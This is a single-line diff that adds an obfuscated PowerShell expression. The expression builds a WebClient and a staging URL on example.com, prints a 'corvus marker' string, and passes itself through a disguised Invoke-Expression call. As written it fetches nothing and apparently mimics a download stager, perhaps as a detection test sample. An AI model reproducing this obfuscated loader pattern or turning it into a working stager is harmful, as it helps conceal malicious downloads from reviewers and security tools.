@@ -1,0 +1,1 @@
+﻿('WC3'+'u'+' = icShttp://exam'+'p'+'le.com/cor'+'vus/st'+'age.t'+'x'+'ticS; '+'W'+'C3w'+'c ='+' Ne'+'w-Obje'+'ct Net.WebClie'+'nt; Writ'+'e-'+'Ho'+'s'+'t icScorvus ma'+'rkeric'+'S;'+' W'+'rite-O'+'utput WC3u').RepLACe(([CHaR]105+[CHaR]99+[CHaR]83),[sTRiNg][CHaR]39).RepLACe(([CHaR]87+[CHaR]67+[CHaR]51),'$')| & ( $PsHOmE[4]+$PShOME[34]+'x')
